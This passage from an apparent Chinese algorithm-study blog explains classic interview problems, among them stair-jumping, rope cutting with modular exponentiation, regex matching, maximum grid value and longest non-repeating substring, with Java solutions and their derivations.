(n&lt;<span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-keyword">return</span> n;<br>    &#125;<br>    <span class="hljs-keyword">int</span> fibOne = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> fibTwo = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> fibN = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br>        fibN = fibOne + fibTwo;<br>        fibOne = fibTwo;<br>        fibTwo = fibN;<br>    &#125;<br>    <span class="hljs-keyword">return</span> fibN;<br>&#125;<br></code></pre></td></tr></table></figure>## 6.2 跳台阶题目：一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法（先后次序不同算不同的结果）。​    如果青蛙当前在第n级台阶上，那它上一步是在哪里呢？​    它上一步必定在第n-1,或者第n-2级台阶，也就是说它跳上n级台阶的跳法数是跳上n-1和跳上n-2级台阶的跳法数之和。即：$$f(n)=f(n-1)+f(n-2)$$那么n<=2的情况，跳上1阶有一种方法，跳到第2阶有两种。即：$$f(n)=\begin{cases} 1, & n=1\\2, &n=2\\f(n-1)+f(n-2),&n>2\end{cases}$$是斐波那契数列的变形，代码：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">numWays</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>      <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">3</span>)&#123;<br>          <span class="hljs-keyword">return</span> n;<br>      &#125;<br>      <span class="hljs-keyword">int</span> fibOne = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">int</span> fibTwo = <span class="hljs-number">2</span>;<br>      <span class="hljs-keyword">int</span> fibN = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">3</span>; i &lt;= n; i++)&#123;<br>          fibN = (fibOne + fibTwo) % <span class="hljs-number">1000000007</span>;<br>          fibOne = fibTwo;<br>          fibTwo = fibN;<br>      &#125;<br>      <span class="hljs-keyword">return</span> fibN;<br>  &#125;<br></code></pre></td></tr></table></figure>## 6.3 变态跳台阶题目：一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。还是跳台阶的思路：$$f(n) = f(1)+f(2)+...+f(n-1)+1\\f(n-1) = f(1)+f(2)+...+f(n-2)+1$$两式相减得：$$f(n)=2f(n-1)$$其实根据数学归纳法得到：$$f(n)=2^{n-1}$$代码：上面的公式<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">JumpFloorII</span><span class="hljs-params">(<span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (target==<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> target;<br>    &#125;<br>    <span class="hljs-keyword">int</span> fibN = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> fibFlag = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=target;i++)&#123;<br>        fibN = <span class="hljs-number">2</span>*fibFlag;<br>        fibFlag = fibN;<br>    &#125;<br>    <span class="hljs-keyword">return</span> fibN;<br>&#125;<br></code></pre></td></tr></table></figure>下面的公式<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">JumpFloorII2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)Math.pow(<span class="hljs-number">2</span>,target-<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>## 6.4 剪绳子Ⅰ​    题目：给你一根长度为 n 的绳子，请把绳子剪成整数长度的 m 段（m、n都是整数，n>1并且m>1），每段绳子的长度记为 k[0],k[1]...k[m-1] 。请问 k[0]*k[1]*...*k[m-1] 可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。数学推导：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">cuttingRope</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> a = n / <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">int</span> b = n % <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-keyword">return</span> n - <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) Math.pow(<span class="hljs-number">3</span>, a);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (b == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) Math.pow(<span class="hljs-number">3</span>, a-<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (b == <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) Math.pow(<span class="hljs-number">3</span>, a)*<span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>动态规划算法：首先是暴力递归：设 *F*(*n*) 为长度为 *n* 的绳子可以得到的最大乘积，对于每一个 *F*(*n*)，可以得到如下分解：<img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/86e7c3368e2edd8c4bfc907b322204198b56cce7e82e7da9a43a8bbaab50cf9e-14.png" alt="14.png" style="zoom: 33%;" />建立一维动态数组 dp：边界条件：dp[1] = dp[2] = 1，表示长度为 2 的绳子最大乘积为 1；状态转移方程：$dp[i] = max(dp[i], max((i - j) * j, j * dp[i - j]))$，可以这样理解：![14.jpg](http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/82b25ac6bcb742f31e5202e4af993d98abfea6a0c385379b214440bbb84b9bb4-14.jpg)*max(i - j , dp[i - j])*中考虑的是用i-j中的最大乘积是否比i-j大（因为*dp[i-j]*本身不包括自己一刀不剪的情况，*dp[i]=dp[i]*是维持当前状态不剪而不是从头开始一刀不剪）<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">cuttingRope</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <span class="hljs-comment">//dp[i]是最长度为i的绳子最大乘积</span><br>        <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>];<br>        dp[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>        dp[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>; <br>        <span class="hljs-keyword">int</span> tmp1 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> tmp2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//转移方程</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt; n + <span class="hljs-number">1</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt; i; j++) &#123;<br>                <span class="hljs-keyword">if</span> (tmp1 &lt; j * dp[i - j]) &#123;<br>                    tmp1 = j * dp[i - j];<br>                &#125;<br>                <span class="hljs-keyword">if</span> (tmp2 &lt; (i-j)*j) &#123;<br>                    tmp2 = (i-j)*j;<br>                &#125;<br>                <br>            &#125;<br>            dp[i] = Math.max(Math.max(tmp1, dp[i]),  tmp2);<br>        &#125;<br><br><br>       <span class="hljs-keyword">return</span> dp[n];<br>    &#125;<br></code></pre></td></tr></table></figure>## 6.5 剪绳子Ⅱ​    题目：给你一根长度为 n 的绳子，请把绳子剪成整数长度的 m 段（m、n都是整数，n>1并且m>1），每段绳子的长度记为 k[0],k[1]...k[m - 1] 。请问 k[0]*k[1]*...*k[m - 1] 可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。**大数越界：** 当 a增大时，最后返回的 3^a大小以指数级别增长，可能超出 `int32` 甚至 `int64` 的取值范围(包括double甚至是long long)，导致返回值错误。解决方法是循环求余或快速幂求余，两种方法均基于以下规则推出：$$(xy)\odot p = [(x\odot p )(y\odot p)]\odot p$$循环求余：- 根据求余运算性质推出（∵ 本题中<font color='red'> x<p</font>，∴ x%p=*x* ）：  ​      $$  x^a\odot p=[(x^{a-1}\odot p)(x\odot p)]\odot p =[(x^{a-1}\odot p)x]\odot p  $$<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; a - <span class="hljs-number">1</span>; i++)&#123;<br>    rem = (rem * <span class="hljs-number">3</span>) % p;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">cuttingRope1</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-keyword">return</span> n - <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> b = n % <span class="hljs-number">3</span>, p = <span class="hljs-number">1000000007</span>, a = n/<span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">long</span> rem = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; a - <span class="hljs-number">1</span>; i++)&#123;<br>        rem = (rem * <span class="hljs-number">3</span>) % p;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(b == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)(rem * <span class="hljs-number">3</span> % p);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(b == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)(rem * <span class="hljs-number">4</span> % p);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)(rem * <span class="hljs-number">6</span> % p);<br>&#125;<br></code></pre></td></tr></table></figure>快速幂求余：$$x^a\odot p=(x^2)^{a/2}\odot p =(x^2\odot p)^{a/2}\odot p$$a为奇数和偶数时：。。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">cuttingRope2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-comment">//快速幂求余</span><br>    <span class="hljs-keyword">if</span>(n &lt;= <span class="hljs-number">3</span>)&#123;<br>        <span class="hljs-keyword">return</span> n - <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> b = n % <span class="hljs-number">3</span>, p = <span class="hljs-number">1000000007</span>;<br>    <span class="hljs-keyword">long</span> rem = <span class="hljs-number">1</span>, x = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> a = n / <span class="hljs-number">3</span> - <span class="hljs-number">1</span>; a &gt; <span class="hljs-number">0</span>; a /= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">if</span>(a % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)&#123;<br>            rem = (rem * x) % p;<br>        &#125;<br>        x = (x * x) % p;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(b == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)(rem * <span class="hljs-number">3</span> % p);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(b == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)(rem * <span class="hljs-number">4</span> % p);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)(rem * <span class="hljs-number">6</span> % p);<br><br>&#125;<br></code></pre></td></tr></table></figure>数学推导：同上贪心算法：同上## 6.6 正则表达式匹配​    题目：请实现一个函数用来匹配包含' . '和' \*‘的正则表达式。模式中的字符'.'表示任意一个字符，而' \*'表示它前面的字符可以出现任意次（含0次）。在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串"aaa"与模式"a.a"和"ab\*ac\*a"匹配，但与"aa.a"和"ab\*a"均不匹配。解题方法：本题使用<font color='red'>动态规划</font>。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(String s, String p)</span> </span>&#123;<br>    <span class="hljs-comment">//s待匹配，p是正则</span><br>    <span class="hljs-keyword">int</span> n = s.length();<br>    <span class="hljs-keyword">int</span> m = p.length();<br>    <span class="hljs-keyword">boolean</span>[][] dp= <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[n+<span class="hljs-number">1</span>][m+<span class="hljs-number">1</span>];<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= n; i++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j&lt;= m; j++)&#123;<br>            <span class="hljs-comment">//空正则</span><br>            <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span>)&#123;<br>                dp[i][j] = i == <span class="hljs-number">0</span>;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//非空正则 两种情况*和非*</span><br>                <span class="hljs-keyword">if</span> (p.charAt(j-<span class="hljs-number">1</span>) != <span class="hljs-string">&#x27;*&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; (s.charAt(i-<span class="hljs-number">1</span>) == p.charAt(j-<span class="hljs-number">1</span>) || p.charAt(j-<span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;.&#x27;</span>))&#123;<br>                        dp[i][j] = dp[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">//遇到*，分为看和不看</span><br>                    <span class="hljs-comment">//看</span><br>                    <span class="hljs-keyword">if</span> (i &gt;=<span class="hljs-number">1</span> &amp;&amp; j&gt;=<span class="hljs-number">2</span> &amp;&amp;(s.charAt(i-<span class="hljs-number">1</span>) == p.charAt(j-<span class="hljs-number">2</span>) || p.charAt(j-<span class="hljs-number">2</span>) == <span class="hljs-string">&#x27;.&#x27;</span>))&#123;<br>                        dp[i][j] |= dp[i-<span class="hljs-number">1</span>][j];<br>                    &#125;<br>                    <span class="hljs-comment">//不看</span><br>                    <span class="hljs-keyword">if</span> (j&gt;=<span class="hljs-number">2</span>)&#123;<br>                        dp[i][j] |= dp[i][j-<span class="hljs-number">2</span>];<br>                    &#125;<br>                &#125;<br><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> dp[n][m];<br>&#125;<br></code></pre></td></tr></table></figure>##  6.7 礼物的最大价值​    题目：在一个 m*n 的棋盘的每一格都放有一个礼物，每个礼物都有一定的价值（价值大于 0）。你可以从棋盘的左上角开始拿格子里的礼物，并每次向右或者向下移动一格、直到到达棋盘的右下角。给定一个棋盘及其上面的礼物的价值，请计算你最多能拿到多少价值的礼物？<font color=red>动态规划</font><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] grid)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (grid == <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[grid.length][grid[<span class="hljs-number">0</span>].length];<br>    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = grid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">int</span> i, j;<br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt; grid[<span class="hljs-number">0</span>].length; j++)&#123;<br>        dp[<span class="hljs-number">0</span>][j] = grid[<span class="hljs-number">0</span>][j] + dp[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; grid.length; i++)&#123;<br>        dp[i][<span class="hljs-number">0</span>] = grid[i][<span class="hljs-number">0</span>] + dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; grid.length; i++)&#123;<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt; grid[<span class="hljs-number">0</span>].length; j++)&#123;<br>            dp[i][j] = Math.max(dp[i-<span class="hljs-number">1</span>][j],dp[i][j-<span class="hljs-number">1</span>])+ grid[i][j];<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">return</span> dp[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-8-最长不含重复字符的子字符串"><a href="#6-8-最长不含重复字符的子字符串" class="headerlink" title="6.8 最长不含重复字符的子字符串"></a>6.8 最长不含重复字符的子字符串</h2><p>​    题目：请从字符串中找出一个最长的不包含重复字符的子字符串，计算该最长子字符串的长度。</p><font color=red>动态规划</font><ul><li><p>状态定义：设动态规划列表 $dp$ ，$dp[j]$ 代表以字符$ s[j]$ 为结尾的 “最长不重复子字符串” 的长度。</p></li><li><p>状态转移： 固定右边界$ j$，设字符 $s[j]$ 左边距离最近的相同字符为 $s[i]$ ，即 $s[i]=s[j]$ 。</p><ol><li><p>$i&lt;0$，即 $s[j]$ 左边无相同字符，则 $dp[j] = dp[j-1] + 1$；</p></li><li><p>当 $dp[j - 1] &lt; j - i$，说明字符 $s[i]$ 在子字符串$ dp[j−1]$ 区间之外 ，则 $dp[j]=dp[j−1]+1$ ；</p></li><li><p>当 $dp[j - 1] ≥j−i$ ，说明字符$ s[i]$ 在子字符串 $dp[j−1]$ 区间之中 ，则 $dp[j]$ 的左边界由 $s[i]$ 决定，即 $dp[j] = j - i$；</p><blockquote><p>当 i&lt;0 时，由于 dp[j−1]≤j 恒成立，因而 dp[j−1]&lt;j−i 恒成立，因此分支 1. 和 2. 可被合并。</p></blockquote><script type="math/tex; mode=display">dp[j] = \begin{cases} dp[j - 1] + 1 & , dp[j-1] < j - i \\ j - i & , dp[j-1] \geq j - i \end{cases}</script></li></ol></li></ul><p>初始值计算：</p><p>方法一：动态规划+哈希表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(String s)</span> </span>&#123;<br>    Map&lt;Character, Integer&gt; dic = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>, tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; s.length(); j++)&#123;<br>        <span class="hljs-keyword">int</span> i = dic.getOrDefault(s.charAt(j), -<span class="hljs-number">1</span>);<br>        dic.put(s.charAt(j),j);<br>        tmp = tmp &lt; j-i ? tmp+<span class="hljs-number">1</span> : j-i;<br>        res = Math.max(res,tmp);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>方法二：滑动窗口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(String s)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (s.length() &lt; <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">return</span> s.length();<br>        &#125;<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>,res = <span class="hljs-number">0</span>;<br>        HashMap&lt;Character,Integer&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        <span class="hljs-keyword">while</span> (j &lt; s.length()) &#123;<br>            <span class="hljs-comment">//右移窗口</span><br>            <span class="hljs-keyword">char</span> tmpj = s.charAt(j);<br>            j++;<br>            <span class="hljs-comment">//更新数据</span><br>            map.put(tmpj, map.getOrDefault(tmpj, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">//判断窗口</span><br>            <span class="hljs-keyword">while</span> (map.get(tmpj) &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">char</span> tmpi = s.charAt(i);<br>                map.put(tmpi, map.get(tmpi) - <span class="hljs-number">1</span>);<br>                i++;<br>            &#125;<br>            res  = Math.max(res, j - i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="6-9-n个骰子的点数"><a href="#6-9-n个骰子的点数" class="headerlink" title="6.9 n个骰子的点数"></a>6.9 n个骰子的点数</h2><p>​    题目：把n个骰子扔在地上，所有骰子朝上一面的点数之和为s。输入n，打印出s的所有可能的值出现的概率。</p><p>你需要用一个浮点数数组返回答案，其中第 i 个元素代表这 n 个骰子所能掷出的点数集合中第 i 小的那个的概率。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span>[] twoSum(<span class="hljs-keyword">int</span> n) &#123;<br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n+<span class="hljs-number">1</span>][<span class="hljs-number">6</span> * n + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">//1.确定初始状态</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">6</span>; i++)&#123;<br>        dp[<span class="hljs-number">1</span>][i] = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">//2.转移方程</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i; j &lt;= <span class="hljs-number">6</span> * i; j++)&#123;<br>            <span 